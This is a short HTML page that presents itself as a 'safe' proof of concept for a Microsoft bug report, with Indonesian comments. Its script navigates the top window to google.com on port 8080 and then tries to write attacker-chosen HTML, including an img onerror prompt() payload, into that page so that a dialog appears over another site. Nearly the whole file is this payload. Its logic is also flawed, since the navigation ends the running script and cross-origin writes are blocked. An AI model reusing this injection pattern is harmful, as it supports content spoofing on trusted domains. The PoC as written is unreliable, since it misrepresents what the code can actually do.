<!DOCTYPE html>
<html>
<head>
  <title>MSRC PoC Demo</title>
</head>
<body>
<h1>MSRC PoC Demo - Safe</h1>
<button id="trigger">Trigger Prompt</button>

<script>
function showPrompt() {
    // Buka tab baru / top-level navigation ke domain test sendiri
    const win = window.open('https://google.com:8080', '_top');

    // Delay untuk memastikan page baru sudah dimuat
    setTimeout(function() {
        // Inject prompt ke halaman baru
        win.document.body.innerHTML = `
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Dhafy</title>
</head>
<body>
    <h1>Dhafy</h1>
    <p>Ini gambar anime online:</p>
    <img src="https://i.pinimg.com/564x/5d/4a/6e/5d4a6eac7f3d17a8d14cbe6efba6b98e.jpg" alt="Anime" width="300">
</body>
</html>            <img src="" onerror="prompt('💡 Demo: bug.bounty.ids dialog persistence','')">
        `;
    }, 150);
}

// Delay eksekusi untuk trigger setelah klik
document.getElementById('trigger').addEventListener('click', function() {
    setTimeout(showPrompt, 300);
});
</script>
</body>
</html>
